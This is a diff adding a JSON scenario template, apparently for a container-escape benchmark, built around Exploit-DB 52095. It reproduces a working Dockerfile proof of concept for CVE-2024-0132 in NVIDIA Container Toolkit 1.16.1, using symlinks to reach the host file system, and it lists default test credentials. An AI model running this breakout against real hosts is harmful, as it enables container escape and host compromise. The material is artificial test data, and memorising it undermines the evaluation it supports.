@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_52095",
+  "category": "E1_docker_escape",
+  "attack_technique": "T1611",
+  "cwe": "CWE-268",
+  "description": "Linux privilege escalation: NVIDIA Container Toolkit 1.16.1 - Time-of-check Time-of-Use (TOCTOU) (CVE-2024-0132)\n\nExploit source code (52095.txt):\n```\n# Exploit Title: Container Breakout with NVIDIA Container Toolkit\n# Date: 17/02/2025\n# Exploit Author: r0binak\n#Software Link Homepage: https://github.com/NVIDIA/nvidia-container-toolkit\n# Version: 1.16.1\n# Tested on: NVIDIA Container Tooklit 1.16.1\n# CVE: CVE-2024-0132\n\nDescription: NVIDIA Container Toolkit 1.16.1 or earlier contains a\nTime-of-check Time-of-Use (TOCTOU) vulnerability when used with\ndefault configuration where a specifically crafted container image may\ngain access to the host file system. This does not impact use cases\nwhere CDI is used. A successful exploit of this vulnerability may lead\nto code execution, denial of service, escalation of privileges,\ninformation disclosure, and data tampering.\n\nPoC link: https://github.com/r0binak/CVE-2024-0132\n\nSteps to Reproduce:\n\nBuild and run a docker image based on such a Dockerfile:\n\nFROM ubuntu\n\nRUN mkdir -p /usr/local/cuda/compat/\n\nRUN mkdir -p /usr/lib/x86_64-linux-gnu/libdxcore.so.1337/\nRUN echo test >\n/usr/lib/x86_64-linux-gnu/libdxcore.so.1337/libdxcore.so.1337.hostfs\n\nRUN mkdir -p /pwn/libdxcore.so.1337/\nRUN ln -s ../../../../../../../../../\n/pwn/libdxcore.so.1337/libdxcore.so.1337.hostfs\n\nRUN ln -s /pwn/libdxcore.so.1337 /usr/local/cuda/compat/libxxx.so.1\n\nRUN ln -s /usr/lib/x86_64-linux-gnu/libdxcore.so.1337/libdxcore.so.1337.hostfs\n/usr/local/cuda/compat/libxxx.so.2\n\nThe host file system will reside in\n/usr/lib/x86_64-linux-gnu/libdxcore.so.1337.hostfs/\n\nRegards,\nSergey `*r0binak*` Kanibor\n```",
+  "cve": "CVE-2024-0132",
+  "exploitdb_id": "52095",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_52095",
+      "type": "core",
+      "difficulty": "hard"
+    }
+  ]
+}
